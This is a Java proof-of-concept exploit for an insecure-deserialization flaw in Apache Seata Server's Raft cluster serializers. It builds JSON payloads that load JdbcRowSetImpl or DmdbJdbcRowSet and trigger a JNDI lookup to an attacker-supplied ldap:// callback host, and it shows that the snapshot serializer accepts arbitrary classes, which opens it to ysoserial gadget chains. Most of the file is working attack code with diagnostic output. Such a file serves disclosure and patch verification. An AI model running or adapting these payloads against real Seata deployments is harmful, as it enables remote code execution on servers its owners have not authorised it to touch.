import java.io.*;
import java.net.*;
import java.util.*;
import java.lang.reflect.*;

import org.apache.seata.server.cluster.raft.serializer.JacksonSerializer;
import org.apache.seata.server.cluster.raft.snapshot.RaftSnapshotSerializer;

/**
 * PoC for CVE-2025-32897: Apache Seata Insecure Deserialization
 *
 * Demonstrates two independent deserialization vulnerabilities in the
 * Raft cluster serialization layer of Apache Seata Server 2.0.0 - 2.2.0:
 *
 * Vector 1: CustomDeserializer calls Class.forName() on attacker-controlled
 *           class names without any package allowlist.
 *           -> Enables JNDI injection via JdbcRowSetImpl / DmdbJdbcRowSet
 *
 * Vector 2: RaftSnapshotSerializer.decode() uses ObjectInputStream.readObject()
 *           without any resolveClass() override or JEP 290 filter.
 *           -> Any Serializable class on the classpath can be deserialized
 *           -> Standard ysoserial gadget chains work directly
 *
 * Usage: java ExploitCVE202532897 [all|vector1|vector2] [callback_host:port]
 */
public class ExploitCVE202532897 {

    private static final String BANNER =
        "================================================================\n" +
        " CVE-2025-32897: Apache Seata Insecure Deserialization PoC\n" +
        " Affected: Seata Server 2.0.0 - 2.2.0 (Raft mode)\n" +
        " Severity: CRITICAL (CVSS 9.8)\n" +
        "================================================================";

    public static void main(String[] args) throws Exception {
        System.out.println(BANNER);
        System.out.println();

        String mode = args.length > 0 ? args[0] : "all";
        String callbackAddr = args.length > 1 ? args[1] : null;

        boolean v1pass = false, v2pass = false;

        if ("all".equals(mode) || "vector1".equals(mode)) {
            v1pass = testVector1_CustomDeserializer(callbackAddr);
        }
        if ("all".equals(mode) || "vector2".equals(mode)) {
            v2pass = testVector2_RaftSnapshotSerializer();
        }

        // Summary
        System.out.println();
        System.out.println("================================================================");
        System.out.println(" RESULTS SUMMARY");
        System.out.println("================================================================");
        if ("all".equals(mode) || "vector1".equals(mode)) {
            System.out.println("  Vector 1 (CustomDeserializer):      " +
                (v1pass ? "[VULNERABLE]" : "[INCONCLUSIVE]"));
        }
        if ("all".equals(mode) || "vector2".equals(mode)) {
            System.out.println("  Vector 2 (RaftSnapshotSerializer):  " +
                (v2pass ? "[VULNERABLE]" : "[INCONCLUSIVE]"));
        }
        System.out.println("================================================================");
    }

    // ====================================================================
    // VECTOR 1: CustomDeserializer - Arbitrary Class Loading via Class.forName()
    // ====================================================================

    /**
     * CustomDeserializer.deserialize() (a Jackson JsonDeserializer for Class<?>)
     * calls Class.forName(className) on attacker-controlled input WITHOUT any
     * package/class allowlist. An attacker who controls the JSON body of a Raft
     * message can specify ANY fully-qualified Java class name.
     *
     * The attack chain:
     *   RaftSyncMessageSerializer.decode()
     *     -> ObjectInputStream.readObject() (outer RaftSyncMessage wrapper)
     *     -> JacksonSerializer.deserialize(body_bytes)
     *       -> OBJECT_MAPPER.readValue(bytes, JsonInfo.class)
     *         -> CustomDeserializer.deserialize() handles "clz" field
     *           -> Class.forName(attacker_class_name)   <-- NO RESTRICTION
     *       -> OBJECT_MAPPER.readValue(obj_bytes, loaded_class)
     *         -> Jackson instantiates attacker's class, sets properties
     *         -> If class is JdbcRowSetImpl: setAutoCommit() -> JNDI lookup -> RCE
     */
    static boolean testVector1_CustomDeserializer(String callbackAddr) {
        System.out.println("[*] VECTOR 1: CustomDeserializer - Arbitrary Class Loading");
        System.out.println("    File: CustomDeserializer.java, line 38");
        System.out.println("    Root cause: Class.forName(className) without allowlist");
        System.out.println("    Impact: JNDI injection -> Remote Code Execution");
        System.out.println();

        // Create JacksonSerializer - this is the exact serializer used in production
        // for Raft message body deserialization (registered via @LoadLevel(name="JACKSON"))
        JacksonSerializer serializer = new JacksonSerializer();
        boolean anyVulnerable = false;

        // ---- Test 1a: Arbitrary class loading (proof of concept) ----
        System.out.println("  [Test 1a] Arbitrary class loading: java.net.URLClassLoader");
        System.out.println("  Purpose: Prove Class.forName() accepts classes outside org.apache.seata");
        try {
            // The "clz" field in JsonInfo is deserialized by CustomDeserializer
            // which calls Class.forName() on the value WITHOUT any check
            String targetClass = "java.net.URLClassLoader";
            String payload = buildJacksonPayload("{}", targetClass);
            System.out.println("  Payload: " + truncate(payload, 100));

            try {
                serializer.deserialize(payload.getBytes("UTF-8"));
                System.out.println("  [VULNERABLE] Class loaded and instantiated!");
                anyVulnerable = true;
            } catch (RuntimeException e) {
                // Even if Jackson fails to instantiate the class (no default constructor,
                // missing properties, etc.), the Class.forName() call ALREADY SUCCEEDED.
                // The exception happens AFTER the class is loaded.
                String chain = getExceptionChain(e);
                if (chain.contains("URLClassLoader")) {
                    System.out.println("  [VULNERABLE] Class.forName(\"" + targetClass + "\") succeeded!");
                    System.out.println("  Jackson failed during instantiation (expected - not a simple bean):");
                    System.out.println("  -> " + truncate(e.getMessage(), 120));
                    anyVulnerable = true;
                } else {
                    System.out.println("  Exception: " + chain);
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getMessage());
        }
        System.out.println();

        // ---- Test 1b: JNDI injection via com.sun.rowset.JdbcRowSetImpl ----
        System.out.println("  [Test 1b] JNDI Injection via com.sun.rowset.JdbcRowSetImpl");
        System.out.println("  Purpose: Demonstrate JNDI injection leading to RCE capability");
        String jndiUrl = (callbackAddr != null) ?
            "ldap://" + callbackAddr + "/exploit" :
            "ldap://127.0.0.1:31337/exploit";
        try {
            String targetClass = "com.sun.rowset.JdbcRowSetImpl";
            // Jackson will:
            // 1. Call Class.forName("com.sun.rowset.JdbcRowSetImpl") via CustomDeserializer
            // 2. Create a new JdbcRowSetImpl()
            // 3. Call setDataSourceName("ldap://...") - sets the JNDI URL
            // 4. Call setAutoCommit(true) - triggers connect() -> InitialContext.lookup() -> JNDI!
            String innerJson = "{\"dataSourceName\":\"" + jndiUrl + "\",\"autoCommit\":true}";
            String payload = buildJacksonPayload(innerJson, targetClass);
            System.out.println("  JNDI URL: " + jndiUrl);
            System.out.println("  Payload: " + truncate(payload, 120));

            try {
                serializer.deserialize(payload.getBytes("UTF-8"));
                System.out.println("  [VULNERABLE] JdbcRowSetImpl instantiated and JNDI triggered!");
                anyVulnerable = true;
            } catch (RuntimeException e) {
                String chain = getExceptionChain(e);
                if (chain.contains("javax.naming") || chain.contains("NamingException") ||
                    chain.contains("CommunicationException") || chain.contains("ldap") ||
                    chain.contains("InitialContext") || chain.contains("Connection refused") ||
                    chain.contains("connect()") || chain.contains("lookup")) {
                    System.out.println("  [VULNERABLE] JNDI injection TRIGGERED!");
                    System.out.println("  CustomDeserializer loaded JdbcRowSetImpl via Class.forName()");
                    System.out.println("  Jackson instantiated it and set dataSourceName + autoCommit");
                    System.out.println("  setAutoCommit(true) called connect() -> InitialContext.lookup()");
                    System.out.println("  JNDI lookup attempted to: " + jndiUrl);
                    System.out.println("  Exception (expected - no LDAP server): " + truncate(getRootCause(e), 150));
                    anyVulnerable = true;
                } else if (chain.contains("JdbcRowSet") || chain.contains("RowSet")) {
                    System.out.println("  [VULNERABLE] JdbcRowSetImpl was loaded and instantiated!");
                    System.out.println("  Exception during property injection: " + truncate(chain, 200));
                    anyVulnerable = true;
                } else {
                    System.out.println("  Exception: " + truncate(chain, 300));
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getMessage());
        }
        System.out.println();

        // ---- Test 1c: DM JDBC Driver gadget (on Seata's classpath) ----
        System.out.println("  [Test 1c] JNDI Injection via dm.jdbc.driver.DmdbJdbcRowSet");
        System.out.println("  Purpose: Same attack using DM JDBC driver (bundled with Seata)");
        try {
            String targetClass = "dm.jdbc.driver.DmdbJdbcRowSet";
            String innerJson = "{\"dataSourceName\":\"" + jndiUrl + "\",\"autoCommit\":true}";
            String payload = buildJacksonPayload(innerJson, targetClass);
            System.out.println("  Payload: " + truncate(payload, 120));

            try {
                serializer.deserialize(payload.getBytes("UTF-8"));
                System.out.println("  [VULNERABLE] DmdbJdbcRowSet instantiated!");
                anyVulnerable = true;
            } catch (RuntimeException e) {
                String chain = getExceptionChain(e);
                if (chain.contains("javax.naming") || chain.contains("NamingException") ||
                    chain.contains("CommunicationException") || chain.contains("ldap") ||
                    chain.contains("Connection refused") || chain.contains("lookup")) {
                    System.out.println("  [VULNERABLE] JNDI injection triggered via DmdbJdbcRowSet!");
                    System.out.println("  Exception: " + truncate(getRootCause(e), 150));
                    anyVulnerable = true;
                } else if (chain.contains("DmdbJdbcRowSet") || chain.contains("Dmdb") ||
                           chain.contains("dm.jdbc")) {
                    System.out.println("  [VULNERABLE] DmdbJdbcRowSet class loaded by Class.forName()!");
                    System.out.println("  Exception: " + truncate(chain, 200));
                    anyVulnerable = true;
                } else {
                    System.out.println("  Exception: " + truncate(chain, 300));
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getMessage());
        }

        return anyVulnerable;
    }

    // ====================================================================
    // VECTOR 2: RaftSnapshotSerializer - Unrestricted Java Deserialization
    // ====================================================================

    /**
     * RaftSnapshotSerializer.decode() uses ObjectInputStream.readObject() without
     * ANY resolveClass() override or JEP 290 deserialization filter.
     *
     * This means ANY Serializable class on the classpath can be deserialized.
     * Standard ysoserial gadget chains (CommonsBeanutils, Spring, H2, etc.)
     * work directly against this code path.
     *
     * The vulnerability:
     *   RaftSnapshotSerializer.decode(byte[] raftSnapshotByte):
     *     ObjectInputStream ois = new ObjectInputStream(bin);  // NO resolveClass()!
     *     Object object = ois.readObject();  // Deserializes ANY class
     *
     * Compare with the (partially) fixed RaftSyncMessageSerializer which HAS
     * a resolveClass() override with a PERMITS whitelist.
     */
    static boolean testVector2_RaftSnapshotSerializer() {
        System.out.println();
        System.out.println("[*] VECTOR 2: RaftSnapshotSerializer - Unrestricted Deserialization");
        System.out.println("    File: RaftSnapshotSerializer.java, line 64-67");
        System.out.println("    Root cause: ObjectInputStream without resolveClass() filter");
        System.out.println("    Impact: ysoserial gadget chains -> Remote Code Execution");
        System.out.println();

        boolean anyVulnerable = false;

        // ---- Test 2a: Deserialize java.util.HashMap ----
        System.out.println("  [Test 2a] Unrestricted deserialization: java.util.HashMap");
        System.out.println("  Purpose: Prove ObjectInputStream accepts ANY Serializable class");
        System.out.println("  Note: A secure implementation would only allow RaftSnapshot class");
        try {
            // Serialize an arbitrary object - this should NEVER be allowed
            // by a properly-filtered ObjectInputStream
            HashMap<String, String> malicious = new HashMap<>();
            malicious.put("attacker_controlled", "arbitrary_data");

            byte[] payload = serializeObject(malicious);
            System.out.println("  Serialized java.util.HashMap: " + payload.length + " bytes");

            try {
                RaftSnapshotSerializer.decode(payload);
                System.out.println("  [VULNERABLE] HashMap deserialized without filtering!");
                anyVulnerable = true;
            } catch (ClassCastException e) {
                // ClassCastException means: ObjectInputStream.readObject() SUCCEEDED
                // (the HashMap was fully deserialized), then the cast to RaftSnapshot failed.
                // In a real attack, ysoserial payloads execute DURING readObject()
                // (via HashMap.readObject() -> hashCode() -> gadget chain),
                // so code execution happens BEFORE the ClassCastException.
                System.out.println("  [VULNERABLE] ObjectInputStream deserialized HashMap without filtering!");
                System.out.println("  ClassCastException confirms the object was fully deserialized:");
                System.out.println("  -> " + e.getMessage());
                System.out.println("  In a real attack:");
                System.out.println("  -> ysoserial gadget chain executes during readObject()");
                System.out.println("  -> Code execution happens BEFORE the ClassCastException");
                System.out.println("  -> The cast never gets a chance to reject the object");
                anyVulnerable = true;
            } catch (IOException e) {
                String chain = getExceptionChain(e);
                if (chain.contains("ClassCastException") || chain.contains("HashMap")) {
                    System.out.println("  [VULNERABLE] HashMap deserialized (IOException wrapping CCE)");
                    anyVulnerable = true;
                } else {
                    System.out.println("  IOException: " + chain);
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getClass().getName() + ": " + e.getMessage());
        }
        System.out.println();

        // ---- Test 2b: Deserialize java.net.InetAddress ----
        System.out.println("  [Test 2b] Unrestricted deserialization: java.net.InetAddress");
        System.out.println("  Purpose: Show dangerous class types can be deserialized");
        try {
            InetAddress addr = InetAddress.getByName("127.0.0.1");
            byte[] payload = serializeObject(addr);
            System.out.println("  Serialized java.net.InetAddress: " + payload.length + " bytes");

            try {
                RaftSnapshotSerializer.decode(payload);
                System.out.println("  [VULNERABLE] InetAddress deserialized!");
                anyVulnerable = true;
            } catch (ClassCastException e) {
                System.out.println("  [VULNERABLE] InetAddress deserialized without filtering!");
                System.out.println("  -> " + e.getMessage());
                anyVulnerable = true;
            } catch (IOException e) {
                String chain = getExceptionChain(e);
                if (chain.contains("ClassCastException") || chain.contains("InetAddress")) {
                    System.out.println("  [VULNERABLE] InetAddress deserialized successfully");
                    anyVulnerable = true;
                } else {
                    System.out.println("  IOException: " + chain);
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getClass().getName() + ": " + e.getMessage());
        }
        System.out.println();

        // ---- Test 2c: Contrast with RaftSyncMessageSerializer (has whitelist) ----
        System.out.println("  [Test 2c] Contrast: RaftSyncMessageSerializer DOES have a whitelist");
        System.out.println("  Purpose: Show that the snapshot path is uniquely unprotected");
        try {
            HashMap<String, String> malicious = new HashMap<>();
            malicious.put("test", "data");
            byte[] payload = serializeObject(malicious);
            System.out.println("  Sending same HashMap to RaftSyncMessageSerializer.decode()...");

            try {
                // This SHOULD reject the HashMap because RaftSyncMessageSerializer
                // has a resolveClass() whitelist (PERMITS list)
                Class<?> syncSerializerClass = Class.forName(
                    "org.apache.seata.server.cluster.raft.sync.RaftSyncMessageSerializer");
                Method decode = syncSerializerClass.getMethod("decode", byte[].class);
                decode.invoke(null, (Object)payload);
                System.out.println("  [UNEXPECTED] HashMap was NOT rejected by RaftSyncMessageSerializer!");
            } catch (InvocationTargetException e) {
                Throwable cause = e.getCause();
                String chain = getExceptionChain(cause);
                if (chain.contains("not permitted") || chain.contains("DESERIALIZATION_SECURITY") ||
                    chain.contains("SeataRuntimeException")) {
                    System.out.println("  [EXPECTED] RaftSyncMessageSerializer REJECTED the HashMap:");
                    System.out.println("  -> " + truncate(cause.getMessage(), 150));
                    System.out.println("  This whitelist does NOT exist in RaftSnapshotSerializer!");
                } else {
                    System.out.println("  Exception: " + truncate(chain, 200));
                }
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e.getClass().getName() + ": " + e.getMessage());
        }

        return anyVulnerable;
    }

    // ====================================================================
    // Helper Methods
    // ====================================================================

    /**
     * Build a JacksonSerializer-compatible JSON payload.
     * Format: {"obj":"<base64-encoded inner JSON>","clz":"<class name>"}
     *
     * When JacksonSerializer.deserialize() processes this:
     * 1. OBJECT_MAPPER.readValue(bytes, JsonInfo.class)
     *    - "clz" field -> CustomDeserializer -> Class.forName(className)
     *    - "obj" field -> byte[] (Base64 decoded)
     * 2. OBJECT_MAPPER.readValue(obj_bytes, loaded_class)
     *    - Jackson instantiates the loaded class with properties from obj
     */
    static String buildJacksonPayload(String innerJson, String className) throws Exception {
        byte[] innerBytes = innerJson.getBytes("UTF-8");
        String base64 = Base64.getEncoder().encodeToString(innerBytes);
        return "{\"obj\":\"" + base64 + "\",\"clz\":\"" + className + "\"}";
    }

    /**
     * Serialize a Java object using standard ObjectOutputStream.
     */
    static byte[] serializeObject(Object obj) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.flush();
        return bos.toByteArray();
    }

    /**
     * Get the full exception chain as a string.
     */
    static String getExceptionChain(Throwable t) {
        StringBuilder sb = new StringBuilder();
        Throwable current = t;
        int depth = 0;
        while (current != null && depth < 10) {
            if (depth > 0) sb.append(" -> ");
            sb.append(current.getClass().getSimpleName());
            if (current.getMessage() != null) {
                sb.append(": ").append(current.getMessage());
            }
            current = current.getCause();
            depth++;
        }
        return sb.toString();
    }

    /**
     * Get the root cause message.
     */
    static String getRootCause(Throwable t) {
        Throwable current = t;
        while (current.getCause() != null) {
            current = current.getCause();
        }
        return current.getClass().getSimpleName() + ": " + current.getMessage();
    }

    /**
     * Truncate a string to maxLen characters.
     */
    static String truncate(String s, int maxLen) {
        if (s == null) return "null";
        return s.length() > maxLen ? s.substring(0, maxLen) + "..." : s;
    }
}
